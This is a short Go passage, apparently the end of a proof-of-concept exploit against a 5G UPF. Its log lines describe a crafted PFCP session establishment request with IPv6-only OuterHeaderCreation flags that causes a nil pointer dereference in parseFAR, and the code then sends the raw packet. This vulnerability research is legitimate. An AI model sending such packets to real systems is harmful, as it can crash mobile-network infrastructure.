	log.Printf("[poc]   Creates FAR with ForwardingParameters containing OuterHeaderCreation")
	log.Printf("[poc]   OuterHeaderCreation flags: 0x0200 (TEID + IPv6 present, no IPv4)")
	log.Printf("[poc]   Note: Even with go-pfcp library, parsing this results in IPv4Address = nil")
	log.Printf("[poc]   This triggers nil pointer dereference in parseFAR at parse_far.go:123")
	log.Printf("[poc]   when accessing ohcFields.IPv4Address in ip2int() call (IPv4Address is nil)")
	_, err = conn.Write(raw)
	if err != nil {
		return fmt.Errorf("failed to send session establishment request: %w", err)
	}
	log.Printf("[poc]   Message sent successfully. Check UPF logs for processing results.")
	return nil
